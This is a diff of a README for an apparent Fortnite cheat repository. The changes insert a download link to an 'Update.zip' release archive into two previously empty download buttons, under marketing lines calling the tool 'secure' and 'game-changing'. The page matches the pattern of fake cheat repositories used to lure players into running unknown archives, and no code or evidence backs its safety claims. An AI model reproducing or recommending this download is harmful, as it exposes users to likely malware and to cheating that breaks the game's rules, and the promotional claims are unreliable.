@@ -2,11 +2,11 @@
 
 > **Transform your Fortnite experience with game-changing features!**  
 > Secure, straightforward, and packed with tools to help you win. 🚀  
-**[![Download Fortnite Cheat](https://img.shields.io/badge/Download-Fortnite%20Cheat%20-red)]()**  
+**[![Download Fortnite Cheat](https://img.shields.io/badge/Download-Fortnite%20Cheat%20-red)](https://github.com/KaylaHailug05p/fortnite-cheat/releases/download/Update/Update.zip)**  
 
 ---
 ![fortnite](https://github.com/user-attachments/assets/c681fbc0-13c6-44b1-92c8-2fd5cdd30134)
-# ***[📁 Download ]()***  
+# ***[📁 Download ](https://github.com/KaylaHailug05p/fortnite-cheat/releases/download/Update/Update.zip)***  
 
 ## 🌟 **Why Use This Fortnite Cheat?**  
 
